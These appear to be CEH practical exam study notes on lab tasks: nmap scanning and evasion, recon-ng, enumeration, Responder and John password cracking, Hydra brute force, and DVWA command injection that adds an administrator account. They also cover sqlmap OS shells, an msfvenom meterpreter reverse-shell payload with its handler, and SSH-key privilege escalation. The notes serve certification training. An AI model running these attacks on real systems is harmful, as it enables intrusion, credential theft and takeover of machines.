Module 2: Footprinting & Reconnaissance

![image](https://github.com/deathsticksguy/CEHv12Practical/assets/34894850/e592f418-0fe9-4f17-84ae-04fba9bf28a3)

Scaanning network Live Host (ping sweep)	nmap -sP IP/CIDR

Scanning Live Host without port scan in same subnet (ARP Scan)	nmap -PR -sn IP/CIDR

Scripts + Version running on target machine	nmap -sC -sV IP/CIDR

OS of the target	nmap -O IP

All open ports of the target	nmap -p- IP/CIDR

Specific port scan of the target	nmap -p <port number> IP/CIDR

Aggressive Scan	nmap -A IP/CIDR

Scanning using NSE scripts	nmap --scripts <script_name> -p <port> IP/CIDR

Scripts + Version + Ports + OS Scan (Overall)	nmap -sC -sV -p- -O -A -v -T4 IP/CIDR

nmap -sn 170.16.0.1/24 -oN nmap.txt

nmap -O 170.16.0.1/24 -oN namp-OS.txt

namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt


4.7 Gather wordlist from Target website using CeWL

Cewl -d 2 -m 5 www.certifiedhacker.com


	-d - Depth to spider
	-m - Minimum word length

OR

Cewl -w wordlist.txt -d 2 -m 5 www.certifiedhacaker.com

Wordlist gets saved in root directory

Pluma wordlist.txt


Module 6: System Hacking

6.1 Active online attack to crack system password using Responder

Ubuntu

Cd Responder
Chmod +x ./Responder.py
Sudo ./Responder.py -l ens3
	-l specifies the interface

Switch to Windows, login

Switch to Linux
home/responder/logs
Open smb-ntlmv2-ssp-IP address.txt file

Sudo john /home/ubuntu/Responder.logs/[Log File Name.txt]


6.2 Audit System Passwords using L0phtCrack

6.3 Find Vulnerabilities on Exploit Sites
www.exploit-db.com

Module 7 - Malware Threats

7.4 Analysing ELF executable file using Detect It Easy (DIE)

Module 8 - Sniffing

8.2.1. Password Sniffing using Wireshark


Tools -> Credentials


Module 11 - Session Hijacking

Module 13 - Hacking Web Servers
13.2.1 - Crack FTP Credentials using a Dictionary attack

Nmap -p 21
Hydra -L <wordlist> -P <passwords.txt> ftp://IP Address of FTP Server

Module 14 - Hacking Web Applications

14.3 Perform Web Spidering using OWASP ZAP
Cd
Zaproxy
Automated Scan -> 

14.4 Detect Load Balancers using Various Tools

Sudo su
cd
Dig yahoo.com
Lbd yahoo.com

Lab 2: Perform Web Application Attacks

Perform Brute-Force attack using Burp Suite (Intruder)
Perform Parameter Tampering using Burp Suite

Proxy Tab -> Intercept On
Forward until you are logged into the user account
Click View Profile tab from Menu bar
Forward on burpsuite
Click INSPECTOR
Change Query Parameters and intercept Off

Exploit RCE Vulnerability to compromise a target web server
Login to DVWA
Command Injection page
Ping a device -> 

| hostname
| whoami
| tasklist
| Taskkill /PID /F (Eg. |Taskkill /3122 /F )
| dir C:\
| net user
| net user Test /Add
| net user
| net user Test
| net localgroup Administrators Test /Add
| net user Test

8. Exploit a File Upload Vulnerability at  Different Security Levels

Module 15: SQL Injection

15.2 Perform SQLI against MSSQL to extract DBs using sqlmap

After logging in, inspect element, get value of document.cookie

Enumerating Databases:
Sqlmap -u “URL” –cookie=”Cookie value” –dbs

Enumerating tables
Sqlmap -u “URL” –cookie=”Cookie value” -D DBname –tables


Dumping table content

Sqlmap -u “URL” –cookie=”Cookie value” -D DBname -T Tablename –dump

Interactive OS Shell

Sqlmap -u “URL” –cookie=”Cookie value” –os-shell

Module 17 - Hacking Mobile Platforms

17.4 Exploit Android platform through ADB using Phonesploit

Cd Phonesploit
// Python3 -m pip install colorama
Python3 phonesploit.py
3
Entry phone IP address
At main_menu prompt, type 4 (Access shell on a phone)
Pwd
Ls
Cd sdcard

Cd Download
Ls

Download/ Pull file: adb pull sdcaard/log.txt /home/username/Desktop

Module 18 - IoT and OT Hacking

18.1 Capture and Analyze IoT Traffic using Wireshark

Type mqtt under filter field, gather msglen, topic length, topic, message from public message, publish release, publish complete and public received

Module 20 - Cryptography

HashCalc
MD5 Calculator
HashMyFiles
CrytoForge
Advanced Encryption Package
BCTextEncoder

Disk Encryption using
VeraCrypt
Bitlocker drive encryption
Rohos Disk Encryption
Cryptanalysis using
CrypTool (RC2 Encryption/ Decryption and 3DES (ECB) )
RC2 - 8 bit keylength, 05 as hexadecimal chaaaaraacter
Triple Des (ECB) with 128 bits (effectively 112 bits) with combinaations of 12 as hexaadecimal characters.

AlphaPeeler

-----------------------------------------------------------------------------------------------------
Notes - Module 2 : Footprinting & Recon

Google Hacking 

intitle:password site:www.eccouncil.org - searches google for "password" in title and site "www.eccouncil.org" 

ec-council filetype:pdf - anything with pdf extension with ec-council as keyword 

cache:www.google.com - query returns cached version of website 

allinurl:google career - query returns only pages containing all terms specified in URL 

Inurl:test - query returns only pages containing word "copy" in URL 

Allintitle: 

Inanchor  

Allinanchor: 

  

Finding Company's Domain and Sub-domains using Netcraft 

www.netcraft.com 

https://sitereport.netcraft.com/ 

Retrieves resources within domain (sub-domains) 

Be sure to utility not breaking the law 

 

 

Website Footprinting using ping: to check Maximum Transmission Unit (MTU) Size, TTL 

Run > CMD as administrator 

Ping www.certifiedhacker.com 

Ping www.certifiedhacker.com -f -l 1500 [ f is for fragmentation, l is to set buffer size or length 

If DF is not set then destination ip is not accepting the set packet length 

 

TTL 

Ping www.certifiedhacker.com -i 3 -n 1[ i is time to live value, n is number of echo requests to be sent to the target ] 

 

Email Footprinting: 

Copy email  headers and paste it into Emailtrackerpro application 

If email is sent from webmail then IP of the server would be available not of the client 

Emailtracker pro doess a whoisof the client IP and shows crosshair on earth map to point the location 

 

Whois Footprinting: 

Whois.domaintools.com and query in the domain or IP address 

 

Can also query from parrot terminal "whois certifiedhacker.com" 

Whois can be performed on IP ranges too 

 

DNS Footprinting: 

Nslookup 

Interactive logon: 

set type=a (setting record type as primary 

Set type-cname (aliasing for) 

 we can set to lookup on a specific ip with "server aaa.bbb.ccc.ddd" 

For zone transfer, set the server to the server that hosts the zone file 

 

Same can be done online .Eg. www.kloth.net/services/nslookup.php 

 

Network Footprinting: 

 

Performing Network Tracerouting on Windows: 

tracert www.certifiedhacker.com 

 tracert -h 5 www.certifiedhacker.com [h is the number of hops] 

  

Performing Network Tracerouting on Linux (Parrot OS): 

traceroute www.certifiedhacker.com 

 

Footprinting using various footprinting tools: 

Recon –ng 

Gathering Info on Target Domain: 

Get SU rights on Parrot Terminal by typing "sudo su" 

"recon-ng" to launch recon-ng tool 

"help" for commands available 

"marketplace install all" to install all modules available in recon-ng, modules are scripts, command sets, pearl, python or ruby scripts. 

After installation: 

"modules search" to display all the modules 

"workspaces" shows commands related to workspace 

We create a workspace, it's a structure in a database to store all our results. 

"workspaces create CEH" 

"workspaces list" shows the list of workspaces created 

"db insert domains" inserts domains column in db 

Enter a value for domain "certifiedhacker.com" 

Enter anything in notes 

"show domains" shows the list of domains added 

We can harvest hosts-related information with certifiedhacker.com by loading network reconnaisance modules such as brute_hosts, Netcraft, and Bing 

"modules load brute" lists the modules starting with brute 

"modules load recon/domains-hosts/brute_hosts" 

"run" to execute the module on listed domains 

"back" to goback to CEH attributes terminal 

To resolve hosts using the Bing module, load bing module and run 

Eg: 

"modules load bing" 

"modules load recon/domains-hosts/bing_domain_web 

"run" 

To reverse resolve, load reverse resolve module and run 

Eg: 

"modules load reverse_resolve" 

"modules load recon/hosts-hosts/reverse-resolve" 

"run" 

"show hosts" to view list of all hosts with ip_address, region, country and module used 

"back" 

 

Creating a report: 

"modules load reporting" fetching types of reporting modules available 

"modules load reporting/html" for loading html report 

"options set FILENAME /root/desktop/results.html" 

"options set CREATOR Eric" 

"options set CUSTOMER CERTIFIED NETWORKS" 

"run" 

Report is now generated at the specified directory above 

Gathering Info on Target User: 

Open "recon-ng" from terminal 

"workspaces create recon" creating a new workspace named recon 

"modules load recon/domains-contacts/whois_pocs" gives point of contacts for a domain 

"info" gives information about the current module 

"options set SOURCE facebook.com" set's the whois source to facebook.com 

"run" to run the module on selected SOURCE 

Make note of contacts returned on this 

"modules load recon/profiles-profiles/namechk" to load module to check existence of contact 

"options set SOURCE MarkZuckerberg" 

"run" to execute check on existence of MarkZuckerberg on facebook.com 

"modules load recon/profiles-profiles/profiler" for loading module to check username existence on various websites 

"options set SOURCE MarkZuckerberg" to check existence of Mark Zuckerberg on various websites 

"run" 

Note the number of profiles found 

"back" 

Load reporting module to generate a report 

"modules load reporting/html" and assign values for FILENAME, CREATOR and CUSTOMER 

"options set FILENAME /home/parrot/profile_recon_results.html" to set filename and save path 

"options set CREATOR Nahyan" 

"options set CUSTOMER Mark Zuckerberg" 

"run" to set the above attributes and generate the report 

------------------------------------------------------------------------------------------------------------
Notes : Module 3 - Scanning Networks

1) Host Discovery using Nmap 

 

a. ARP Ping Scan 

"nmap –sn –PR 10.10.10.16" …. 's' almost always indicates a scan type, could be service version too 

-sn is for no port scan 

-PR is for ARP Ping....'P' is ping of discovery type... 'R' is for AARP......'PA' is for ACK Scan 

 

Result: indicates if target host is up or not 

 

b.  UDP Ping Scan: for discovering hosts from a range of target IP addresses 

"nmap –sn –PU 10.10.10.16" performs UDP ping scan 

-PU...'P' is ping of discovery type....'U' is for UDP 

 

UDP response received if host is up 

No response means target host offline/ unreachable, error message or TTL exceeded 

 

c. ICMP Echo Ping Scan 

"nmap –sn –PE 10.10.10.16" … 'E' is for ECHO, may or may not get accurate results as ICMP echo requests are filtered at times 

 

If host active, ICMP ECHO reply received 

 

 

d. ICMP Echo Ping Sweep 

"nmap –sn –PE 10.10.10.16-20" for scanning 16 to 20 …. we scan entire ranges... we can indicate ranges with comma separation, slash notation of bits and subnet mask..wildcards for variables in the octect etc... 

  

Alternatives to ICMP ECHO pings if they're blocked: 

 

#nmap –sn –PP a.b.c.d - ICMP timestamp ping scan 

 

#nmap –sn –PM a.b.c.d ICMP address mask ping scan …..'M' is a netmask request (for acquiring information related to subnet mask) 

 

#nmap –sn –PS a.b.c.d TCP SYN Ping Scan... sends empty TCP SYN packets to target host, ACK response means host is active....'S' is for TCP SYN Ping Scan 

 

#nmap –sn –PA a.b.c.d TCP ACK Ping Scan.... Sends empty TCP ACK packets to the target host:an RST response means host is active.....'A' for TCP Ack Ping 

 

#nmap –sn –PO a.b.c.d IP Protocol Ping Scan (aka raw socket switch)....sends different probe packets of different IP protocols to target host, any response from any probe indicates that a host is active (we're pinging protocols here) 

 

2) Perform Port and Service Discovery 

 

"nmap –sT –v a.b.c.d" …..'T' is for scanning the target IP address.....'v' is for verbose output (include all hosts and ports in the output) 

 

By default nmap scans for top 1000 used ports 

 

"nmap –sS –v a.b.c.d" …'S' stands for stealth scan as it doesn't get logged... resets the connection before It's built... maintains stealth to a degree 

 

----illegal flag configuration scans---- 

 

"nmap –sX –v a.b.c.d" ….'X' stands for x-mas scan 

"nmap –sM –v a.b.c.d" …'M' stands for maimon scan 

 

------------------------------------------------------ 

"nmap –sU –v a.b.c.d."….'U' stands for UDP scan 

 

**Creating a new scan profile** 

Profile->new profile-> remove existing syntax-> give profile name as "Null Scan" and choose attributes accordingly... here we choose '-sN' from TCP Scan drop-down list 'None' in Non-TCP Scans and Aggressive (-T4) in the Timing template list and all aggressive options enabled '-A'. 

 

IDLE/IPID Header Scan: 

 

#nmap –sl –v a.b.c.d.... '-l' is for IDLE/IPID Scan 

It's a TCP port scan method that can be used to send a spoofed source address to a computer to discover what services are available. 

 

SCTP INIT Scan: 

#nmap –sY –v a.b.c.d....'Y' is for INIT Scan 

An INIT Chunk is sent to the target host:an INIT + ACK Chunk response implies that the port is open, and an ABORT Chunk response means that the port is closed. 

 

SCTP COOKIE ECHO Scan: 

#nmap –sZ –v a.b.c.d....'Z' is for COOKIE ECHO Scan 

A COOKIE ECHO chunk is sent to the target host: no response implies that the port is open and ABORT Chunk response means that the port is closed. 

 

Version Detection: 

#nmap –sV a.b.c.d 

-sV detects service versions....helpful for identifying the exact vulnerabilities in the versions of services 

 

Aggressive Scan: 

#nmap –A a.b.c.d 

'A' is for aggressive scan, ut supports Os detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute). Not be used against target networks without permission. 

 

3) OS Discovery using Nmap Script Engine (NSE) 

 

"nmap –A a.b.c.d" for aggressive scan, displaying open ports and running services along with their versions and the target details 

 

"nmap –O a.b.c.d." performs OS Discovery.... '-O' is for OS Discovery 

 

"nmap –script smb-os-discovery.nse a.b.c.d"…. '--script' specifies the customized script and smb-os-discovery.nse' attempts to determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 and 139). 

 

4) Scanning beyond IDS/Firewall using various Evasion Techniques 

 

"nmap –f a.b.c.d." -f is used to split IP packet into tiny fragment packets, IDSs and firewalls generally queue all of these packets and process them one by one. This method of processing involves greater CPU consumption as well as network resources, the configuration of most of IDSs makes it skip fragmented packets during port scans. 

 

"nmap –g 80 a.b.c.d"…..'-g' or '--source-port' is used for port manipulation. Source port manipulation refers to manipulating actual port numbers with common port numbers to evade IDS/firewall; useful when firewall is configured to allow packets from well-known ports like HTTP, DNS, FTP, etc. 

 

"nmap –mtu 8 a.b.c.d" …. '-mtu' is used for number of Maximum Transmission Unit (MTU (here 8 bytes of packets)). Using MTU, smaller packets are transmitted instead of sending one complete packet at a time. This techniique evades the filtering and detection mechanism enabled in the target machine. 

 

"nmap –D RND:10 a.b.d.c.d" ….'-D' performs a decoy scan and RND generates a random and non-reserved IP address. 

 

IP Address decoy technique refers to generating or manually specifying IP address of the decoys to evade IDS/firewall. This technique makes it difficult for the IDS/firewall to determine which IP address was actually scanning the network and which IP addresses were decoys. By using this command. Nmap automatically generates a random number of decoys for the scan and randomly positions the real IP address between the decoy IP addresses. 

 

5) Create Custom UDP and TCP Packets using Hping3 to Scan beyond IDS/Firewall 

 

Log in to parrot machine, get super user access on terminal 

 

"hping3 a.b.c.d --udp –rand-source –data 500"…..'--udp' refers to sending UDP packets to the target host..... 

'--rand-source' enables the random source mode 

'--data' specifies the packet body size 

 

Press Ctrl+C to break the command and proceed with other commands 

 

"hping3 –S a.b.c.d -p 80 –c 5"….. '-S' specifies the TCP SYN request on the target machine, -p specifies assigning the port to send the traffic, and –c is the count of the packets sent to the target machine 

 

"hping3 a.b.c.d. --flood" ….. '--flood' performs TCP flooding..... can be used for DOS attack or stress testing 

 

6) Networking Scanning using Metasploit 

 

Metasploit has lot of similar scan types built in like nmap 

 

Open MATE terminal in parrot, get su rights using "sudo su" command 

 

Getting started with Metasploit 

  

"service postgresql start" to start postgresql service 

"msfconsole" to launch Metasploit 

"db_status" to check if Metasploit has connected to the database successfully. If we receive the message 'postgresql selected, no connection' then the database did not connect to msf 

The database hasn't connect so we perform "exit" and initiate the database msf connection using "msfdb init" 

"service postgresql restart" to restart the postgresql service after initiating db connectivity 

"msfconsole" to intiate Metasploit Framework console 

"db_status" for checking database status.. This time, the database should successfully connect to msf 

"nmap –Pn –sS –A –oX Test 10.10.10.10/24" to scan the subnet, here we are scanning the whole subnet for active hosts... the result shows the number of active hosts in the target network.. 

"db_import Test" to import Nmap results from the database 

"hosts" to view list of active hosts along with their MAC addresses, OS names, etc. 

"services" or "db_services" to receive a list of the services running on the active hosts 

 

In addition to running Nmap, there are a variety of other port scanners that are available within the Metasploit Framework to scan the target systems 

 

"search portscan" … The Metasploit port scanning modules appear 

 

"use auxiliary/canner/portscan/syn" to use the module to perform a SYN scan on the target systems 

set INTERFACE eth0 

set PORTS 80 

set RHOSTS 10.10.10.5-20 

Set THREADS 50 

 

'PORTS' specifies the ports to scan....'RHOSTS' specifies the target address range or CIDR identifier and 'THREADS' specifies the number of concurrent threads 

 

"run" to initiate the scan against target IP address ranges. Similarly, we can also specify a range of ports to be scanned against the target IP address range. 

 

The results display open port 80 in active hosts.. 

 

B. Performing TCP scan for open ports on target systems 

 

"back" to revert to the msf command line 

To load auxiliary/scanner/portscan/tcp module type "use auxiliary/scanner/portscan/tcp"  

"hosts –R" to automatically set this option with discovered hosts present in our database  

(OR) 

"set RHOSTS a.b.c.d" 

"run" to discover open TCP ports in the target system 

The results display all open TCP ports in the target IP address 

 

Now that we have the active hosts on the target network, we can further attempt to determine the OSes running on the target systems. As there are systems in our scan that have port 445 open, we will use the module scanner/smb/version to determine which version of Windows is running on a target and which Samba version is on a Linux host 

 

"back" to revert to msf command line 

 

"use auxiliary/scanner/smb/smb_version" This module is used to run a SMB version scan against the taret IP address 

set RHOSTS 10.10.10.5-20 

set THREADS 11 

run 

 

 

Scanning for FTP versions on the system 

 

"back" to revert to msf command line 

"use auxillary/scanner/ftp/ftp_version" to load FTP module 

set RHOSTS 10.10.10.10 

run 

We should be getting FTP version details of the target host 

"hosts" to list all the discovered hosts... 

"back" to return from the module 

"hosts –o /root/Desktop/Metasploit_Scan_Results.csv" to export the gathered information to a csv file and observe it... it contains detailed information on the active hosts in the target IP ranges 

 

This information can be further be used to perform vulnerability analysis on the open services discovered in the target hosts. 

 ----------------------------------------------------------------------------------------------------------------------------------------
 Notes : Module 4 - Enumeration

 1) Performing NetBIOS Enumeration using Windows Command Line utilities 

Open Command Prompt 

#nbstat –a a.b.c.d …..'-a' displays the NetBIOS name of the remote computer 

#nbstat –c a.b.c.d....'-c' displays the content of NetBIOS name cache of the remote computer (cache timeout is 600 seconds by default) 

 

It's possible to extract this information without creating a null session (an authenticated session) 

 

#netuse …. output displays information about the target such as connection status, shared folder/drive and network information 

 

2) Perform SNMP Eunmeration using snmp-check on Parrot OS 

 

Open MATE Terminal 

 

Before starting SNMP enumeration we should check whether SNMP port is open.UDP Port 161 is used by SNMP by default. We use Nmap port scan to check this. 

 

#sudo su 

#cd 

#nmap –sU –p 161 a.b.c.d..... '-sU' performs UDP scan and '–p' specifies the port to be scanned 

#snmp–check a.b.c.d..... the command enumerates the target machine and lists sensitive information such as System Information and User accounts... It shows Network Information, Network interfaces, Network IP and Routing information, and TCP connections and listening ports.... it also reveals sensitive information such as Processes, Storage Information, File system information, Device Information, Share.. Etc 

 

3) LDAP Enumeration using Active Directory Explorer (AD Explorer) 

 

Install Active Directory Explorer from sys internal tools 

Navigate to any username and we can right click any attribute and modify the user's profile 

 

4) Network File System Enumeration using RPCScan and SuperEnum 

 

Using SuperEnum 

 

Enable NFS Service on target system by going to server manager -> add roles and pages... Enabled File for NFS under File and ISCSI Services under File and Storage and Install 

 

Launch Parrot OS 

Launch MATE Terminal 

#nmap –p 2049 a.b.c.d ...to check if NFS service is running 

#cd SuperEnum/ …..to navigate to SuperEnum folder 

#echo "a.b.c.d." >>Target.txt.... 

#./superenum ….. and under "Enter IP List filename with path" type "Target.txt" ...if we get an error using the ./superenum script then "chmod = x superenum" 

Try "./superenum" and under "Enter IP List filename with path" type "Target.txt"  

Scan takes 15-20 minutes to complete... we can observe other open ports and services running on them as well... 

#cd-- … to return to the root directory 

 

Using RPCScan 

 

Launch MATE Terminal 

#cd RPCScan/ 

#python3 rpc-scan.py a.b.c.d. --rpc..... '--rpc' lists the RPC (portmapper) 

The results display if 2049 port is open and if NFS service is running on it 

 

5) Performing DNS Enumeration using Zone Transfer 

 

On Linux based OS 

 

Launch Parrot OS 

Launch MATE Terminal 

#sudo su 

#cd 

#dig ns [Target Domain] … 'ns' returns name servers in the result... it retrieves information about all the DNs name servers of the target domain and displays it in the ANSWER SECTION 

 

…. On Linux-based systems, the dig command is used to query the DNS name servers to retrieve information about target host addresses, name servers, mail exchanges. Etc 

#dig @[[NameServer]] [[Target Domain]] axfr …..'axfr' retrieves zone information 

The result appears, display that the server is available, but that the transfer failed... 

 

After retrieving DNS name server information, the attacker can use one of the servers to test whether the target DNS allows zone transfer or not. In this case, zone transfers are not allowed for the target domain; this is why the command resulted in the message:Transfer failed. A Penetration Tester should attempt DNS zone transfer on different domains of the target organization. 

 

On Windows OS 

 

Open cmd [26:33 minute] 

#nslookup … opens nslookup in interactive mode 

#set type=soa 

#ls –d [Name Server] …. '-d' requests a zone transfer of the specified name server 

 

6) Enumerate information using global network inventory 

 

Install Global Network Inventory tool from the Scanning Modules ZIP folder 

Install 

In the New Audit Wizard, choose Single address scan-> Next 

Specify a range -> Next 

Continue with the options... 

 

End result is that we can see Computer System, Processors, Main Board, Memory, SNMP Systems, Main Board and Hot Fixes etc.... 
----------------------------------------------------------------------------------------------------------------------------------------
Notes : Module 5 - Vulneraability Analysis:
1) Perform Vulnerability Research in Common Vulnerabilites and Exposures (CVE) 

 

https://cve.mitre.org 

 

Named after the year and order of inclusion.. 

 

Eg. CVE-2020-13910 

 

We can also search by protocol or technology 

 

Other resources are national vulnerability database, exploitdb, securityfocus etc... 

 

2) Perform Vulnerability Analysis using Open VAS 

 

Vulnerability Scanner are of two types majorly: 

Conventional 

Web Apps – more pricey 

 

Launch ParrotOS 

Start Greenbone Vulnerability Management 

Visit loopback address https://127.0.0.1:9392 

Login with "admin" and "password" 

Open the VAS Dashboard 

Go to Tasks tab 

Click on Magic Wand and run an immediate scan on a.b.c.d 

Start Scan 

Once Scan is Done... Click on "Done" button to look at details of the scan 

Run Scan with and without the target machine firewall enabled 

Compare the reports 
------------------------------------------------------------------------------------------
Notes : Module 16 - System Hacking
1) Perform Active Online Attack to Crack the System's Password using Responder 

 

2) Explot Client-Side Vulnerabilities and Establish a VNC Session 

 

Launch ParrotOS 

Launch MATE Terminal 

#sudo su 

#cd 

#msfvenom –p windows windows/meterpreter/reverse_tcp –platform windows –a x86 –f exe LHOST=[IP address of host machine] LPORT=444 –o /root/Desktop/Test.exe 

 

#mkdir /var/www/html/share … to create a shared folder 

#chmod –R755/var/www/html/share 

#chwon –R www-data:www-data /var/www/html/share 

 

Copy malicious file to shared location by typing: 

#cp /root/Desktop/Test.exe /var/www/html/share/ 

 

Start the apache service: 

#service apache2 start 

#msfconsole 

#use exploit/multi/handler 

#set payload windows/meterpreter/reverse_tcp 

#set LHOST 10.10.10.13 

#set LPORT 444 

#exploit ….. Starts reverse TCP Handler…. Payload will connect to the system and establish reverse connection 

Open the url configured on the victim machine and download and run the exe file 

 

Open Parrot OS 

Meterpreter session is opened now and we now have a meterpreter shell…. If It doesn't open by default we can type "session -i 1" to initiate the shell 

Meterpreter shell is a command shell 

#sysinfo 

#upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1 (This uploads the PowerSploit file to target system's present in working directory…. (ps1 is powershell script) 

 

PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system 

#shell (opens a command shell on the system on the same directory that download was executed on) 

#powershell -ExecutionPolicy Bypass -Command "..\PowerUp.ps1;Invoke-AllChecks" 
----------------------------------------------------------------------------------------------------

**Nikto Web Vulnerability Scanner
**
Command: nikto -h [target website] -Tuning x

-h : Target host
x : Reverse Tuning Options (include all except specified)

Command: nikto -h [target website] -Cgidirs all

-Cgidirs: scans specified CGI directories

Saving to Desktop
 cd Desktop
 nikto -h [Target Website] -o [File_Name] -F txt

 -h : specifies the target
 -o: specifies the name of the output file
 -F : specifies the file format

 pluma File_Name
 
----------------------------------------------------------------------------------------------------

1) Horizontal Privilege escalation:

sudo -l   for getting other users and their privileges

sudo -u user2 /bin/bash

whoami

cat flag.txt

2) Vertical Privilege escalation:

in .ssh directory we have RSA keys

Copy private key (id_rsa) and in local machine, create new file:

nano id_rsa
paste the private key (save and exit ctrl +s and ctrl+x)
chmod 600 id_rsa
ssh root@TargetIP -p PORTNO -i id_rsa


____________________________________________________________________________________________________________
Resources: 

https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9

https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
 
